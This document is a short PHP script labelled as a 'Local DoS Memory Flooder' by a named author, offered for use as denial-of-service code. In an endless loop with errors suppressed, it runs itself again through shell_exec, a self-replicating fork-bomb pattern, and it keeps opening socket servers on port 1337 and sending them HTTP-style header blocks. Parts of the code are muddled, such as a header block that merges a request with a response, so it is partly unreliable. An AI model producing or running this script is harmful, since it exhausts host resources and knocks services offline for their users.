<?php
// Local DoS Memory Flooder By AnarchoXploit
error_reporting(0);
$local = "0.0.0.0";
$port = 1337;
$array = "\r
curl/7.58.0
Chrome
Mozilla
";
$user_agn = explode("\n", $array);
while(true) {
echo "\nFlooding Memory";
$file = $_SERVER["PHP_SELF"];
echo shell_exec("php $file");
foreach($user_agn as $user) {
$uri = "tcp://$local:$port";
$flags = STREAM_SERVER_BIND | STREAM_SERVER_LISTEN;
$server = stream_socket_server($uri, $errno, $errstr, $flags);
$c = stream_socket_accept($server, 0);
if(!empty($user)) {
$head = "\r
GET / HTTP/1.1
Host: $local:$port
User-Agent: $user
Accept: */*

HTTP/1.1 200 OK
Host: $local:$port
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 103
\n";
$open = fsockopen("tcp://".$local, $port);
$cok = fwrite($open, $head);
fclose($open);
} else {
continue;
}
}
}
?>
